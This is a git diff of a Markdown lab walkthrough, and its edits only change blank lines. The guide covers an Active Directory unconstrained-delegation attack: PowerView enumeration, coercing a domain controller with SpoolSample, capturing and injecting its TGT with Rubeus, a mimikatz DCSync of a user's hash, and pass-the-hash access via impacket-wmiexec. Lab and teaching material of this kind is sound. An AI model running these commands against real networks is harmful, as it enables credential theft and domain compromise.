@@ -22,13 +22,13 @@ Use following command in powershell.exe to dot source the script first:
 
 ```bash
 . .\Powerview_dev.ps1
-
 ```
 **<u>Dot sourcing</u>**
 
 The dot sourcing feature lets you run a script in the current scope instead of in the script scope. When you run a script that is dot sourced, the commands in the script run as though you had typed them at the command prompt
 
 - On workstation-01 run Powerview:
+
 ```bash
 . .\Powerview_dev.ps1
 
@@ -37,6 +37,7 @@ The dot sourcing feature lets you run a script in the current scope instead of i
 ![image3](../resources/8ebb39d0918648d3b86f734d76c7d861.png)
 
 - Enumerating for unconstrained delegation:
+
 ```bash
 Get-DomainComputer -Unconstrained -Properties dnshostname
 
@@ -51,6 +52,7 @@ Get-DomainComputer -Unconstrained -Properties dnshostname
 Now that you have access to a host with an unconstrained delegation set, you can force a privileged user to connect to the system. To do this, you'll need to use the MS-RPRN tool (aka spoolsample). This tool will force a DC account to connect to our hostname; in this case, Workstation-02
 
 - Open an elevated command prompt and monitor for TGT **(Open in CMD not PS)**:
+
 ```bash
 Rubeus.exe monitor /interval:1
 
@@ -96,6 +98,7 @@ python3 -c 'f=open("ticket.txt").read();import re;print(re.sub(r"[\n\t\s]*", "",
 ![image10](../resources/e1433203f58b43c893bef66332ce4b21.png)
 
 - Load the ticket into memory:
+
 ```bash
 .\Rubeus.exe ptt /ticket:DC.kirbi
 
@@ -104,6 +107,7 @@ python3 -c 'f=open("ticket.txt").read();import re;print(re.sub(r"[\n\t\s]*", "",
 ![image11](../resources/6c20fb63571042a6a69ed2f1ec95cecb.png)
 
 - Check that it has been loaded in successfully:
+
 ```bash
 klist
 
@@ -118,6 +122,7 @@ klist
 ![image14](../resources/71f94ac080a24844b1622f1374fe491c.png)
 
 - Open mimikatz:
+
 ```bash
 lsadump::dcsync /user:krbtown\a.belridge
 
@@ -126,6 +131,7 @@ lsadump::dcsync /user:krbtown\a.belridge
 ![image15](../resources/68b77d027e6d4eb9bd58e5dd8f0a56e1.png)
 
 - Use wmiexec to gain access to the DC:
+
 ```bash
 impacket-wmiexec [DOMAIN]/[USERNAME]@[TARGET] -hashes [LM-HASH]:[NT-HASH] 
 
